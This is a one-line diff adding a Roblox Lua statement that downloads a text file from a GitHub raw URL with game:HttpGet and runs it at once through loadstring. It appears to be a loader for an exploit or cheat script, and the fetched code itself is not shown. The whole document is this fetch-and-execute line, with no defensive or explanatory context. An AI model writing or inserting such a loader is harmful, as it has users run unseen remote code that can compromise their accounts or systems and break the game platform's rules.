@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ttuws/Test111/main/kobtlam1.txt"))()
